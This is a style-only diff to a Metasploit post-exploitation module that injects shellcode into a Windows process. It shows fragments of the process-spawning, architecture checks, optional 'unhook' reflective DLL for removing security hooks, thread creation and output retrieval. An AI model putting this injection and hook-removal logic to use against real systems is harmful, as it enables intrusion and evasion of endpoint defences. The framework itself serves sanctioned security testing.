@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Post
   # Run Method for when run command is issued
   def run
     # syinfo is only on meterpreter sessions
-    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
+    print_status("Running module against #{sysinfo['Computer']}") if !sysinfo.nil?
 
     # Set variables
     shellcode = File.binread(datastore['SHELLCODE'])
@@ -65,18 +65,18 @@ class MetasploitModule < Msf::Post
     end
 
     # prelim check
-    if client.arch == ARCH_X86 and @payload_arch == ARCH_X64
-      fail_with(Failure::BadConfig, "Cannot inject a 64-bit payload into any process on a 32-bit OS")
+    if (client.arch == ARCH_X86) && (@payload_arch == ARCH_X64)
+      fail_with(Failure::BadConfig, 'Cannot inject a 64-bit payload into any process on a 32-bit OS')
     end
 
-    if datastore['PPID'] != 0 and datastore['PID'] != 0
-      print_error("PID and PPID are mutually exclusive")
+    if (datastore['PPID'] != 0) && (datastore['PID'] != 0)
+      print_error('PID and PPID are mutually exclusive')
       return false
     end
 
     # Start Notepad if Required
     if pid == 0
-      if ppid != 0 and not has_pid?(ppid)
+      if (ppid != 0) && !has_pid?(ppid)
         print_error("Process #{ppid} was not found")
         return false
       elsif ppid != 0
@@ -112,17 +112,17 @@ class MetasploitModule < Msf::Post
     end
 
     # Check
-    if bits == ARCH_X64 and client.arch == ARCH_X86
-      print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
-      print_error("Migrate to an x64 process and try again.")
+    if (bits == ARCH_X64) && (client.arch == ARCH_X86)
+      print_error('You are trying to inject to a x64 process from a x86 version of Meterpreter.')
+      print_error('Migrate to an x64 process and try again.')
       return false
     end
     if arch_check(bits, proc.pid)
       if datastore['AUTOUNHOOK']
-        print_status("Executing unhook")
+        print_status('Executing unhook')
         print_status("Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...")
         unless inject_unhook(proc, bits, datastore['WAIT_UNHOOK'])
-          fail_with(Failure::BadConfig, "Unknown target arch; unable to assign unhook dll")
+          fail_with(Failure::BadConfig, 'Unknown target arch; unable to assign unhook dll')
         end
       end
       begin
@@ -132,7 +132,7 @@ class MetasploitModule < Msf::Post
         print_error(e.to_s)
       end
     else
-      fail_with(Failure::BadConfig, "Arch mismatch between shellcode and process!")
+      fail_with(Failure::BadConfig, 'Arch mismatch between shellcode and process!')
     end
   end
 
@@ -141,10 +141,10 @@ class MetasploitModule < Msf::Post
     proc.thread.create(mem, 0)
     print_good("Successfully injected payload into process: #{proc.pid}")
     if datastore['INTERACTIVE'] && datastore['CHANNELIZED'] && datastore['PID'] == 0
-      print_status("Interacting")
+      print_status('Interacting')
       client.console.interact_with_channel(proc.channel)
     elsif datastore['CHANNELIZED'] && datastore['PID'] == 0
-      print_status("Retrieving output")
+      print_status('Retrieving output')
       data = proc.channel.read
       print_line(data) if data
     end
